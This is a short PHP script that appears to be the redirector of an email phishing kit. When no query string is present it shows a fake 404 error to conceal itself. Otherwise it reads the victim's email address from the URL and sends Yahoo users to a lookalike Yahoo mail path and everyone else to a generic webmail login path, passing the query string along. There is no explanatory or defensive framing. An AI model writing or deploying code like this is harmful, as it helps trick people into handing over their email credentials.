<?php
$url = $_SERVER['QUERY_STRING'];

if (empty($url)=== true) {
      echo "HTTP Error 404- File or Directory not found.\n";
      die();
}
$email = $_GET["email"];
$var = substr(strrchr($email, "@"), 1);
session_start();
session_regenerate_id();
      if (strstr($var,'yahoo')){
    header("Location: us-mg6.mail.yahoo/index.php?".$url);
}else {
    header("Location: webmail.mail219.atl121.mcsv/index.php?".$url);
}
?>

